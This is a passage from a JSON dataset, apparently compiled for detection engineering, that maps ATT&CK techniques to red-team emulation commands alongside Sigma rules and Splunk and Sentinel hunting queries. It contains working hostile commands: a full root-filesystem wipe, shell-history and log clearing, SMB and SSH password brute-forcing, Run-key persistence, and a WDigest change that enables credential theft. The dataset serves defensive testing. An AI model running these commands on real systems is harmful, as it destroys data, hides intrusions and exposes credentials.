"https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191", "Reegun J (OCBC Bank)"], "author": "Beyu Denis, oscd.community", "date": "2019/10/26", "modified": "2019/11/04", "tags": ["attack.command_and_control", "attack.t1105"], "level": "high", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image|endswith": ["\\powerpnt.exe", "\\winword.exe", "\\excel.exe"], "CommandLine|contains": "http"}, "condition": "selection"}, "falsepositives": ["Unknown"]}}]}, {"technique_id": "T1106", "commands": [{"source": "atomics/T1106/T1106.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\n%tmp/T1106.exe\n", "name": null}, {"source": "atomics/T1106/T1106.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe #{source_file}\n%tmp/T1106.exe\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_add_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_add_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_delete_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_delete_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_start_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/chronos_api_start_job", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_delete_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/dcos/marathon_api_delete_app", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/http_rest_api", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/network/http_rest_api", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - T1106 -": {"attack_technique": "T1106", "display_name": "T1106 -", "atomic_tests": [{"name": "Execution through API - CreateProcess", "description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.", "supported_platforms": ["windows"], "input_arguments": {"source_file": {"description": "Location of the CSharp source_file", "type": "Path", "default": "PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs"}, "output_file": {"description": "Location of the payload", "type": "Path", "default": "%tmp%\\T1106.exe"}}, "executor": {"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe #{source_file}\n%tmp/T1106.exe\n", "name": "command_prompt"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/chronos_api_add_job", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "T1168", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_add_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/chronos_api_delete_job", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "T1168", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_delete_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/chronos_api_start_job", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "T1168", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/chronos_api_start_job\":  [\"T1106\",\"T1168\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/marathon_api_create_start_app", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/marathon_api_create_start_app\":  [\"T1106\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/dcos/marathon_api_delete_app", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/dcos/marathon_api_delete_app\":  [\"T1106\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/http_rest_api", "ATT&CK Technique #1": "T1106", "ATT&CK Technique #2": "", "Technique": "Execution through API", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/http_rest_api\":  [\"T1106\"],"}}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\n%tmp/T1106.exe\n", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe #{source_file}\n%tmp/T1106.exe\n", "python/situational_awareness/network/dcos/chronos_api_add_job", "python/situational_awareness/network/dcos/chronos_api_add_job", "python/situational_awareness/network/dcos/chronos_api_delete_job", "python/situational_awareness/network/dcos/chronos_api_delete_job", "python/situational_awareness/network/dcos/chronos_api_start_job", "python/situational_awareness/network/dcos/chronos_api_start_job", "python/situational_awareness/network/dcos/marathon_api_create_start_app", "python/situational_awareness/network/dcos/marathon_api_create_start_app", "python/situational_awareness/network/dcos/marathon_api_delete_app", "python/situational_awareness/network/dcos/marathon_api_delete_app", "python/situational_awareness/network/http_rest_api", "python/situational_awareness/network/http_rest_api"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1107", "commands": [{"source": "atomics/T1107/T1107.yaml", "command": "rm -f /tmp/victim-files/a\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "rm -rf /tmp/victim-files\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "shred -u /tmp/victim-shred.txt\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "del /f %temp%\\deleteme_T1107\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "rmdir /s /q %temp%\\deleteme_T1107\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "Remove-Item -path $env:TEMP\\deleteme_T1107\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "Remove-Item -Path $env:TEMP\\deleteme_folder_T1107 -Recurse\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "name": null}, {"source": "atomics/T1107/T1107.yaml", "command": "Remove-Item $env:TEMP\\TeamViewer_54.log\n", "name": null}, {"source": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml", "command": {"darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "windows": {"psh": {"command": "Clear-History;Clear"}}}, "name": "Stop terminal from logging history"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -rf test1.text", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -f test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "shred -u test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - File Deletion": {"attack_technique": "T1107", "display_name": "File Deletion", "atomic_tests": [{"name": "Delete a single file - Linux/macOS", "description": "Delete a single file from the temporary directory\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"file_to_delete": {"description": "Path of file to delete", "type": "Path", "default": "/tmp/victim-files/a"}}, "executor": {"name": "sh", "command": "rm -f #{file_to_delete}\n"}}, {"name": "Delete an entire folder - Linux/macOS", "description": "Recursively delete the temporary directory and all files contained within it\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"folder_to_delete": {"description": "Path of folder to delete", "type": "Path", "default": "/tmp/victim-files"}}, "executor": {"name": "sh", "command": "rm -rf #{folder_to_delete}\n"}}, {"name": "Overwrite and delete a file with shred", "description": "Use the `shred` command to overwrite the temporary file and then delete it\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_shred": {"description": "Path of file to shred", "type": "Path", "default": "/tmp/victim-shred.txt"}}, "executor": {"name": "sh", "command": "shred -u #{file_to_shred}\n"}}, {"name": "Delete a single file - Windows cmd", "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_delete": {"description": "File to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "%temp%\\deleteme_T1107"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n", "prereq_command": "IF EXIST \"#{file_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo deleteme_T1107 >> #{file_to_delete}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "del /f #{file_to_delete}\n"}}, {"name": "Delete an entire folder - Windows cmd", "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"folder_to_delete": {"description": "Folder to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "%temp%\\deleteme_T1107"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{folder_to_delete})\n", "prereq_command": "IF EXIST \"#{folder_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{folder_to_delete}\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "rmdir /s /q #{folder_to_delete}\n"}}, {"name": "Delete a single file - Windows PowerShell", "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_delete": {"description": "File to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "$env:TEMP\\deleteme_T1107"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n", "prereq_command": "if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_to_delete} | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item -path #{file_to_delete}\n"}}, {"name": "Delete an entire folder - Windows PowerShell", "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"folder_to_delete": {"description": "Folder to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "$env:TEMP\\deleteme_folder_T1107"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The folder to delete must exist on disk at specified location (#{folder_to_delete})\n", "prereq_command": "if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{folder_to_delete} -Type Directory | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item -Path #{folder_to_delete} -Recurse\n"}}, {"name": "Delete Filesystem - Linux", "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n"}}, {"name": "Delete-PrefetchFile", "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n"}}, {"name": "Delete TeamViewer Log Files", "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n", "supported_platforms": ["windows"], "input_arguments": {"teamviewer_log_file": {"description": "Teamviewer log file to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "$env:TEMP\\TeamViewer_54.log"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The folder to delete must exist on disk at specified location (#{teamviewer_log_file})\n", "prereq_command": "if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{teamviewer_log_file} | Out-Null\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item #{teamviewer_log_file}\n"}}]}}, {"Mitre Stockpile - Stop terminal from logging history": {"id": "43b3754c-def4-4699-a673-1d85648fda6a", "name": "Avoid logs", "description": "Stop terminal from logging history", "tactic": "defense-evasion", "technique": {"attack_id": "T1107", "name": "File Deletion"}, "platforms": {"darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "windows": {"psh": {"command": "Clear-History;Clear"}}}}}], "command_list": ["rm -f /tmp/victim-files/a\n", "rm -rf /tmp/victim-files\n", "shred -u /tmp/victim-shred.txt\n", "del /f %temp%\\deleteme_T1107\n", "rmdir /s /q %temp%\\deleteme_T1107\n", "Remove-Item -path $env:TEMP\\deleteme_T1107\n", "Remove-Item -Path $env:TEMP\\deleteme_folder_T1107 -Recurse\n", "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "Remove-Item $env:TEMP\\TeamViewer_54.log\n", {"darwin": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "linux": {"sh": {"command": "> $HOME/.bash_history && unset HISTFILE\n"}}, "windows": {"psh": {"command": "Clear-History;Clear"}}}, "```", "rm -rf test1.text", "```", "```", "rm -f test1.txt", "```", "```", "shred -u test1.txt", "```"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"*remove-item*\"or process_command_line contains \"vssadmin*Delete Shadows /All /Q*\"or process_command_line contains \"*wmic*shadowcopy delete*\"or process_command_line contains \"*wbdadmin* delete catalog -q*\"or process_command_line contains \"*bcdedit*bootstatuspolicy ignoreallfailures*\"or process_command_line contains \"*bcdedit*recoveryenabled no*\")", "name": "File Deletion"}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=59 comm=shred | table host,auid,msg", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit type=execve shred .bash_history | table host,msg,a0,a2", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,eid,exe", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=82 exe=/usr/bin/shred | table host,auid,uid,eid,exe", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "-a always,exit -F arch=b64 -S execve,execveat -F auid>=1000 -F auid!=-1 -F key=program_execution", "name": null}, {"product": "Splunk", "query": "-w /home/ec2-user/.bash_history -p rwa -k bash_history_changes", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" bash_command=\"rm *\"", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" bash_command=\"shred -u *\"", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}, {"data_source": {"title": "Backup Catalog Deleted", "id": "9703792d-fd9a-456d-a672-ff92efe4806a", "status": "experimental", "description": "Detects backup catalog deletions", "references": ["https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx", "https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100"], "author": "Florian Roth (rule), Tom U. @c_APT_ure (collection)", "tags": ["attack.defense_evasion", "attack.t1107"], "logsource": {"product": "windows", "service": "application"}, "detection": {"selection": {"EventID": 524, "Source": "Backup"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "medium"}}]}, {"technique_id": "T1110", "commands": [{"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> passwords.txt\necho \"1q2w3e4r\" >> passwords.txt\necho \"Password!\" >> passwords.txt\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "name": null}, {"source": "atomics/T1110/T1110.yaml", "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/get_sql_server_login_default_pw", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/get_sql_server_login_default_pw", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/http_login", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/recon/http_login", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbautobrute", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbautobrute", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbscanner", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/smbscanner", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Shell\nroot @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V\nHydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.", "name": "Shell"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "auth.log", "name": "auth.log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nFailed password for root from 192.168.159.129 port 43728 ssh2", "name": "Log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "audit.log", "name": "audit.log"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\ntype = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = \"root\" exe = \"/ usr / sbin / sshd\" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Brute Force Credential Access": {"attack_technique": "T1110", "display_name": "Brute Force Credential Access", "atomic_tests": [{"name": "Brute Force Credentials", "description": "Creates username and password files then attempts to brute force on remote host\n", "supported_platforms": ["windows"], "input_arguments": {"input_file_users": {"description": "Path to a file containing a list of users that we will attempt to brute force", "type": "Path", "default": "DomainUsers.txt"}, "input_file_passwords": {"description": "Path to a file containing a list of passwords we will attempt to brute force with", "type": "Path", "default": "passwords.txt"}, "remote_host": {"description": "Hostname of the target system we will brute force upon", "type": "String", "default": "\\\\COMPANYDC1\\IPC$"}, "domain": {"description": "Domain name of the target system we will brute force upon", "type": "String", "default": "YOUR_COMPANY"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/recon/get_sql_server_login_default_pw", "ATT&CK Technique #1": "T1110", "ATT&CK Technique #2": "", "Technique": "Brute Force", "Concatenate for Python Dictionary": "\"powershell/recon/get_sql_server_login_default_pw\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/recon/http_login", "ATT&CK Technique #1": "T1110", "ATT&CK Technique #2": "", "Technique": "Brute Force", "Concatenate for Python Dictionary": "\"powershell/recon/http_login\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/smbautobrute", "ATT&CK Technique #1": "T1110", "ATT&CK Technique #2": "", "Technique": "Brute Force", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/smbautobrute\":  [\"T1110\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/smbscanner", "ATT&CK Technique #1": "T1110", "ATT&CK Technique #2": "", "Technique": "Brute Force", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/smbscanner\":  [\"T1110\"],"}}], "command_list": ["net user /domain > DomainUsers.txt\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "net user /domain > #{input_file_users}\necho \"Password1\" >> passwords.txt\necho \"1q2w3e4r\" >> passwords.txt\necho \"Password!\" >> passwords.txt\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use #{remote_host} /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\\\COMPANYDC1\\IPC$ /user:#{domain}\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\\\COMPANYDC1\\IPC$ > NUL\n", "net user /domain > #{input_file_users}\necho \"Password1\" >> #{input_file_passwords}\necho \"1q2w3e4r\" >> #{input_file_passwords}\necho \"Password!\" >> #{input_file_passwords}\n@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL\n", "powershell/recon/get_sql_server_login_default_pw", "powershell/recon/get_sql_server_login_default_pw", "powershell/recon/http_login", "powershell/recon/http_login", "powershell/situational_awareness/network/smbautobrute", "powershell/situational_awareness/network/smbautobrute", "powershell/situational_awareness/network/smbscanner", "powershell/situational_awareness/network/smbscanner", "Shell\nroot @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V\nHydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.", "auth.log", "Log\nFailed password for root from 192.168.159.129 port 43728 ssh2", "audit.log", "Log\ntype = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = \"root\" exe = \"/ usr / sbin / sshd\" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '"], "attack_paths": [], "queries": [{"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: linux under ssh brute force\ndescription: Ubuntu18.04, kali\nreferences:\ntags: T1110\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: auth.log / audit.log\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- 'Failed password for * ssh2' #linux auth.log\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* exe = \"/ usr / sbin / sshd\" * terminal = ssh res = failed' #linux audit.log\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": "/var/log/secure"}]}, {"technique_id": "T1112", "commands": [{"source": "atomics/T1112/T1112.yaml", "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "name": null}, {"source": "atomics/T1112/T1112.yaml", "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet 